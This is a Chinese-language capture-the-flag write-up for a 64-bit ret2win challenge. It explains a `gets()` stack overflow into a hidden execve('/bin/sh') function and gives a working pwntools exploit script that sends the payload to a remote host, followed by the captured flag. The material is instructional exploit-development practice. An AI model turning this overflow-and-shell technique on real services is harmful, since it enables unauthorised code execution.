# Welcome Pwn3R

## 题目简述

目标是一个 64 位 x86 ELF，启用了 NX 和 Partial RELRO，但没有 PIE 与栈 Canary。`main()` 在栈上准备缓冲区后直接调用 `gets()`：

```c
char buf[0x20];
gets(buf);
```

程序还保留了一个不会被正常调用的 `secret()`。该函数用内联汇编在栈上构造 `/bin/sh\0`，清零 `rsi`、`rdx`，并执行系统调用号 `59`，等价于 `execve("/bin/sh", NULL, NULL)`。

## 解题过程

两个汇编常量异或得到：

```text
0x88f1d994a2b48cd0 XOR 0x8899aabbccddeeff
= 0x0068732f6e69622f
= "/bin/sh\0"（小端）
```

另一个常量关系为 `0x1337 XOR 0x130c = 0x3b`，即 AMD64 的 `execve` 系统调用号。因此只需覆盖返回地址到 `secret()`，不需要泄露 libc 或构造复杂 ROP。

根据官方二进制的栈布局，从输入起点到 saved RIP 的偏移是 `0x48`。由于没有 PIE，`secret` 地址固定，可以直接由 ELF 符号取得：

```python
#!/usr/bin/env python3
import sys

from pwn import ELF, flat, remote


elf = ELF("./welcome", checksec=False)
host = sys.argv[1]
port = int(sys.argv[2])

io = remote(host, port)
io.recvuntil(b": ")
io.sendline(flat(b"A" * 0x48, elf.sym.secret))
io.interactive()
```

返回地址被改写后，`main()` 返回到 `secret()`，该函数执行 `execve` 并获得 shell。读取 flag 得到：

```text
shellmates{g000d_s7@rt_Pwn3R_U_c4n_c0Nt1Nu3!!}
```

## 方法总结

这是标准的 ret2win 变体：危险输入函数提供 saved RIP 覆盖，而隐藏函数已经准备好最终系统调用。分析时应先固定架构、保护、真实覆盖偏移和隐藏函数语义；不能只因源码缓冲区是 `0x20` 就把偏移误写成 `0x28`，编译器为其它局部变量和栈对齐保留的空间同样会影响布局。

NX 只阻止在栈上直接执行输入，并不阻止返回到现有代码。No PIE 又使目标函数地址稳定，因此本题最短路线是覆盖返回地址，而不是无必要地引入 libc 泄露或 shellcode。
